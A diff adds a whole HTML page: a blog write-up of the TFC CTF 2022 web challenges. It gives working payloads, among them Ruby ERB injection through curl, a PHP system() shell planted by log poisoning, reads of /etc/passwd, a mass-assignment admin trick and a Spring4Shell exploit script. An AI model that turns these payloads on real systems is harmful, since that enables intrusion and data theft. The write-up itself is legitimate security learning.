@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='TFC CTF 2022 Write Up'><title>TFC CTF 2022</title>
+
+<link rel='canonical' href='https://g0tfl4g.github.io/p/tfc-ctf-2022/'>
+
+<link rel="stylesheet" href="/scss/style.min.dbf896e8cd60d6cd94ddb762ebfacc6b843c5e6adabbafc546590c0cfb42b484.css"><meta property='og:title' content='TFC CTF 2022'>
+<meta property='og:description' content='TFC CTF 2022 Write Up'>
+<meta property='og:url' content='https://g0tfl4g.github.io/p/tfc-ctf-2022/'>
+<meta property='og:site_name' content='g0tfl4g'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Web' /><meta property='article:published_time' content='2022-08-01T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-08-01T00:00:00&#43;00:00'/><meta property='og:image' content='https://g0tfl4g.github.io/p/tfc-ctf-2022/img/tfc.svg' />
+<meta name="twitter:title" content="TFC CTF 2022">
+<meta name="twitter:description" content="TFC CTF 2022 Write Up"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://g0tfl4g.github.io/p/tfc-ctf-2022/img/tfc.svg' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/flag_hu40f68efc952b4ca9c7f9f9e01771dc3c_52374_300x0_resize_box_3.png" width="300"
+                            height="187" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">g0tfl4g</a></h1>
+            <h2 class="site-description">CTF player, Penetration Tester, Bug Bounty Hunter.</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/tfc-ctf-2022/">
+                
+                    <img src="/p/tfc-ctf-2022/img/tfc.svg" loading="lazy" alt="Featured image of post TFC CTF 2022" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/tfc-ctf-2022/">TFC CTF 2022</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            TFC CTF 2022 Write Up
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 01, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    4 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>Participated in TFC CTF 2022 with my team CyberSpace. I only played Web and solved all web challenges (8/8).</p>
+<p><img src="/p/tfc-ctf-2022/img/cyberspace.png"
+	width="812"
+	height="285"
+	srcset="/p/tfc-ctf-2022/img/cyberspace_hu2112b81b67da904c1c5ee2a07b11d1fb_96400_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/cyberspace_hu2112b81b67da904c1c5ee2a07b11d1fb_96400_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="284"
+		data-flex-basis="683px"
+	
+></p>
+<h2 id="robots-and-music">ROBOTS AND MUSIC</h2>
+<p>Web | WarmUp</p>
+<p>From the <code>robots.txt</code>, we can get the hidden endpoint <code>/g00d_old_mus1c.php</code>.</p>
+<p><img src="/p/tfc-ctf-2022/img/ram_flag.png"
+	width="724"
+	height="200"
+	srcset="/p/tfc-ctf-2022/img/ram_flag_hu212d35c9c0cfe3a431978919ecb13910_71508_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/ram_flag_hu212d35c9c0cfe3a431978919ecb13910_71508_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="362"
+		data-flex-basis="868px"
+	
+></p>
+<h2 id="pong">PONG</h2>
+<p>Web | WarmUp</p>
+<p>This challenge is about <code>Command Injection</code>.</p>
+<p><img src="/p/tfc-ctf-2022/img/pong_1.png"
+	width="753"
+	height="94"
+	srcset="/p/tfc-ctf-2022/img/pong_1_hu206110c39a57cada11b8434d1c61d708_17411_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/pong_1_hu206110c39a57cada11b8434d1c61d708_17411_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="801"
+		data-flex-basis="1922px"
+	
+></p>
+<p>Using <code>|</code> (pipe), we can inject the command as shown below.</p>
+<p><img src="/p/tfc-ctf-2022/img/pong_2.png"
+	width="570"
+	height="105"
+	srcset="/p/tfc-ctf-2022/img/pong_2_hu30fe6a42004ea367a2ae96de2e45109c_16230_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/pong_2_hu30fe6a42004ea367a2ae96de2e45109c_16230_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="542"
+		data-flex-basis="1302px"
+	
+></p>
+<p><img src="/p/tfc-ctf-2022/img/pong_3.png"
+	width="579"
+	height="147"
+	srcset="/p/tfc-ctf-2022/img/pong_3_hu733a723221b89395d3d9eb3829a61b0a_15175_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/pong_3_hu733a723221b89395d3d9eb3829a61b0a_15175_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="393"
+		data-flex-basis="945px"
+	
+></p>
+<p>And we can get the flag</p>
+<p><img src="/p/tfc-ctf-2022/img/pong_flag.png"
+	width="604"
+	height="124"
+	srcset="/p/tfc-ctf-2022/img/pong_flag_hu9599fa11d88c120df778cb281188bca0_20256_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/pong_flag_hu9599fa11d88c120df778cb281188bca0_20256_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="487"
+		data-flex-basis="1169px"
+	
+></p>
+<h2 id="are-you-the-admin">ARE YOU THE ADMIN?</h2>
+<p>Web | Easy</p>
+<p>For this challenge, they provided us the source code, <code>index.tsx, auth.ts and schema prisma</code>, but I didn&rsquo;t need them to solve this one.</p>
+<p>We just need to add the extra parameter, <code>isAdmin</code>, in the JSON body when creating the account.</p>
+<p><img src="/p/tfc-ctf-2022/img/ayta_4.png"
+	width="700"
+	height="138"
+	srcset="/p/tfc-ctf-2022/img/ayta_4_hu8473064779c170fe6ecea2aaeb66a6d4_22175_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/ayta_4_hu8473064779c170fe6ecea2aaeb66a6d4_22175_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="507"
+		data-flex-basis="1217px"
+	
+></p>
+<p><img src="/p/tfc-ctf-2022/img/ayta_5.png"
+	width="700"
+	height="217"
+	srcset="/p/tfc-ctf-2022/img/ayta_5_hu5b6421da2675ab9fb9e8087c56dbefa0_61408_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/ayta_5_hu5b6421da2675ab9fb9e8087c56dbefa0_61408_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="322"
+		data-flex-basis="774px"
+	
+></p>
+<h2 id="deeplinks">DEEPLINKS</h2>
+<p>Web | Easy</p>
+<p>The challenge description gives a hint about <code>iOS app</code>.</p>
+<p><img src="/p/tfc-ctf-2022/img/deeplinks_flag.png"
+	width="797"
+	height="244"
+	srcset="/p/tfc-ctf-2022/img/deeplinks_flag_hu3cf18214051e292e97c92b53b8150fde_123842_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/deeplinks_flag_hu3cf18214051e292e97c92b53b8150fde_123842_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="326"
+		data-flex-basis="783px"
+	
+></p>
+<h2 id="calendar">CALENDAR</h2>
+<p>Web | Medium</p>
+<p>From the website, we can find out that the application is using a vulnerable version of modern-event-calendar-lite wordpress plugin.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CVE-2021-24146
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Lack of authorisation checks in the Modern Events Calendar Lite WP plugin,
+</span></span><span class="line"><span class="cl">versions before 5.16.5, did not restrict access to the export files,
+</span></span><span class="line"><span class="cl">allowing unauthenticated users to exports all events data in CSV or XML
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tfc-ctf-2022/img/calendar_1.png"
+	width="797"
+	height="121"
+	srcset="/p/tfc-ctf-2022/img/calendar_1_hu6c294fd38cefba4105c396c0be1a5f71_25534_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/calendar_1_hu6c294fd38cefba4105c396c0be1a5f71_25534_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="658"
+		data-flex-basis="1580px"
+	
+></p>
+<p>The exploit code can be found from the Exploit-DB (<a class="link" href="https://www.exploit-db.com/exploits/50084"  target="_blank" rel="noopener"
+    >Wordpress Plugin Modern Events Calendar 5.16.2 - Event export</a>)</p>
+<p><img src="/p/tfc-ctf-2022/img/calendar_2.png"
+	width="799"
+	height="104"
+	srcset="/p/tfc-ctf-2022/img/calendar_2_hu4fe2c5595e26cf6d8d1c3d9b464627e4_127485_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/calendar_2_hu4fe2c5595e26cf6d8d1c3d9b464627e4_127485_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="768"
+		data-flex-basis="1843px"
+	
+></p>
+<h2 id="diamonds">DIAMONDS</h2>
+<p>Web | Medium</p>
+<p>This challenge is about Ruby Regex Bypassing + SSTI.</p>
+<p><img src="/p/tfc-ctf-2022/img/diamonds_1.png"
+	width="678"
+	height="160"
+	srcset="/p/tfc-ctf-2022/img/diamonds_1_hu06d562399b9ee0bb5ae6b55771bf5627_46119_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/diamonds_1_hu06d562399b9ee0bb5ae6b55771bf5627_46119_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="423"
+		data-flex-basis="1017px"
+	
+></p>
+<p>If we attempt to submit characters such as <code>Å</code> (%c5), we can get the debug page due to <code>Invalid Byte Sequence in UTF-8</code> error and also the part of the source code.</p>
+<p><img src="/p/tfc-ctf-2022/img/diamonds_3.png"
+	width="914"
+	height="686"
+	srcset="/p/tfc-ctf-2022/img/diamonds_3_hu47d9daa382604fc39fba4a03b1d711a9_279142_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/diamonds_3_hu47d9daa382604fc39fba4a03b1d711a9_279142_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="133"
+		data-flex-basis="319px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"> <span class="k">if</span> <span class="n">params</span><span class="o">[</span><span class="ss">:input</span><span class="o">]</span> <span class="o">=~</span> <span class="sr">/^[0-9a-z ]+$/i</span>
+</span></span><span class="line"><span class="cl">    <span class="vi">@input</span> <span class="o">=</span> <span class="no">ERB</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:input</span><span class="o">]</span><span class="p">)</span><span class="o">.</span><span class="n">result</span><span class="p">(</span><span class="nb">binding</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It seems like there is no issue but in Ruby the <code>^</code> and <code>$</code> match at the start and end of each line. Therefore if any line matches the regex, we can bypass it.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Directory Listing </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Payload : &lt;%= Dir.entries(&#39;/&#39;) %&gt;</span>
+</span></span><span class="line"><span class="cl">curl http://01.linux.challenges.ctf.thefewchosen.com:49768/ -d <span class="s1">&#39;input=a
+</span></span></span><span class="line"><span class="cl"><span class="s1">%3C%25%3D%20Dir%2Eentries%28%27%2E%2F%27%29%20%25%3E&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Read Flag</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Payload : &lt;%= File.open(&#39;flag.txt&#39;).read %&gt;</span>
+</span></span><span class="line"><span class="cl">curl http://01.linux.challenges.ctf.thefewchosen.com:49768/ -d <span class="s1">&#39;input=a
+</span></span></span><span class="line"><span class="cl"><span class="s1">%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tfc-ctf-2022/img/diamonds_flag.png"
+	width="815"
+	height="63"
+	srcset="/p/tfc-ctf-2022/img/diamonds_flag_hubff68bc76b4a09b77b7c53f1b560a005_74358_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/diamonds_flag_hubff68bc76b4a09b77b7c53f1b560a005_74358_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1293"
+		data-flex-basis="3104px"
+	
+></p>
+<h2 id="include-what-matters">INCLUDE WHAT MATTERS</h2>
+<p>Web | Medium</p>
+<p>Typical LFI challenge.</p>
+<p><img src="/p/tfc-ctf-2022/img/lfi_1.png"
+	width="815"
+	height="225"
+	srcset="/p/tfc-ctf-2022/img/lfi_1_hu47bcca9a0c0c9b923b68f56580229deb_77999_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/lfi_1_hu47bcca9a0c0c9b923b68f56580229deb_77999_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="362"
+		data-flex-basis="869px"
+	
+></p>
+<p><img src="/p/tfc-ctf-2022/img/lfi_2.png"
+	width="815"
+	height="225"
+	srcset="/p/tfc-ctf-2022/img/lfi_2_hua13cdf5e4a4967a93f4d7a0c3a8c0de8_129747_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/lfi_2_hua13cdf5e4a4967a93f4d7a0c3a8c0de8_129747_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="362"
+		data-flex-basis="869px"
+	
+></p>
+<p>I tried to read the <code>flag.txt</code> but didn&rsquo;t work. As we already have LFI, we can try RCE via Log Poisoning.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /?file=/etc/passwd HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 01.linux.challenges.ctf.thefewchosen.com:49774
+</span></span><span class="line"><span class="cl">User-Agent: User-Agent: &lt;?php system($_GET[&#39;c&#39;]); ?&gt;
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class="line"><span class="cl">Accept-Language: en-US,en;q=0.5
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we just need to check the log file via LFI and execute our commands.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /?file=/var/log/apache2/access.log&amp;c=ls%20-al%20/
+</span></span><span class="line"><span class="cl">GET /?file=/var/log/apache2/access.log&amp;c=cat%20/hidden_fl4g.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tfc-ctf-2022/img/lfi_3.png"
+	width="813"
+	height="394"
+	srcset="/p/tfc-ctf-2022/img/lfi_3_hu723867e7acf2578ebe8021258c49f68f_174001_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/lfi_3_hu723867e7acf2578ebe8021258c49f68f_174001_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="206"
+		data-flex-basis="495px"
+	
+></p>
+<h2 id="tubeinc">TUBEINC</h2>
+<p>Web | Hard</p>
+<p>We have to get 2 flags, user and root, to complete this challenge.</p>
+<p>From the website footer, we can get the following information.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">footer</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>For the complete functionality of the page add the following entries to your DNS configuration and use tube.com:PORT to connect to the platform.<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    34.65.33.171 tube.com<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    34.65.33.171 legacy.tube.com<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    DO NOT USE THIS IN PRODUCTION!<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">footer</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Just add those 2 lines in the <code>/etc/hosts</code> file and visit the website <code>legacy.tube.com</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">34.65.33.171 tube.com
+</span></span><span class="line"><span class="cl">34.65.33.171 legacy.tube.com
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Again from the bottom of the page, we can get the important information.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"> <span class="c">&lt;!--
+</span></span></span><span class="line"><span class="cl"><span class="c">    Important!
+</span></span></span><span class="line"><span class="cl"><span class="c">    Due to the recent discovery of a major vulnerability of the used framework, this platform is now deprecated (more information at /info).
+</span></span></span><span class="line"><span class="cl"><span class="c">    It remains available only for backward compatibility reasons.
+</span></span></span><span class="line"><span class="cl"><span class="c">
+</span></span></span><span class="line"><span class="cl"><span class="c">    DO NOT USE THIS PLATFORM IN PRODUCTION!
+</span></span></span><span class="line"><span class="cl"><span class="c">  --&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>/info</code> page tells us that the website is using a compromised &ldquo;Spring-Boot&rdquo; framework. Yeaahhhh we all can assume that this is about <code>Spring4Shell</code> vulnerability.</p>
+<p><img src="/p/tfc-ctf-2022/img/tube_1.png"
+	width="814"
+	height="127"
+	srcset="/p/tfc-ctf-2022/img/tube_1_hu4f4b71684740d2f195f50dc0580d25fe_43664_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/tube_1_hu4f4b71684740d2f195f50dc0580d25fe_43664_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="640"
+		data-flex-basis="1538px"
+	
+></p>
+<p>Google <code>Spring4Shell</code> exploit and just use any exploit you want.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/Leovalcante/spring4shell
+</span></span><span class="line"><span class="cl">python3 spring4shell.py http://legacy.tube.com:52524
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we can get the user flag from the <code>/home/user.flag</code></p>
+<p><img src="/p/tfc-ctf-2022/img/tube_3.png"
+	width="810"
+	height="59"
